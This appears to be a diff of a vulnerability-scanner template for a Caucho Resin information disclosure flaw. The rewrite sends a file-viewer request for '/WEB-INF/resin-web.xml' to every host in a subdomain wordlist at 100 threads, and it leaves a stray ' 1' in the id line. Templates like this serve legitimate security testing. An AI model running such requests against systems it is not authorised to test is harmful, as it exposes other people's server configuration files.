@@ -1,28 +1,35 @@
-id: caucho-resin-info-disclosure
-
+id: caucho-resin-info-disclosure 1
 info:
-  name: Caucho Resin Information Disclosure
   author: pikpikcu
+  name: Caucho Resin Information Disclosure
+  reference: https://www.exploit-db.com/exploits/27888
   severity: info
-  reference:
-    - https://www.exploit-db.com/exploits/27888
-  tags: exposure,resin,caucho,edb
-
+  tags: exposure,resin
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml" # Version: 3.0.17/3.0.18
-      - "{{BaseURL}}/%20../web-inf/web.xml" # Version: 3.1.1
+- attack: sniper
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - <web-app
+    - </web-app>
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /resin-doc/viewfile/?file=/WEB-INF/resin-web.xml HTTP/1.1
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "<web-app"
-          - "</web-app>"
-        part: body
-        condition: and
+    Host: {{Subdomains}}
 
-      - type: status
-        status:
-          - 200
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    '
+  threads: 100
